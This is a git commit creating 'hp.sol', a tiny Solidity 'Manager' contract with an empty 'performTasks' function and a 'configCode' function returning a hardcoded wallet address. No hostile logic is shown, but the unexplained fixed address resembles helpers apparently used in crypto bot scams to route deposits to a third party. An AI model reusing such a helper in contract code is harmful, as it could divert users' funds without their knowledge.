132b7a6f0710bf3a677f662730db78b2ac77d6be
aistrator <112416600+aistrator@users.noreply.github.com>
2022-08-29 23:29:33 +0700

    Create hp.sol

---
+++ hp.sol
@@ -0,0 +1,9 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.6.12;  
+contract Manager {   
+function performTasks() public {}   
+function configCode() public pure returns (address) {     
+return 0xC86F57Ec55cfEf4C2123f6afB797E3Cc96651490;
+  }
+}
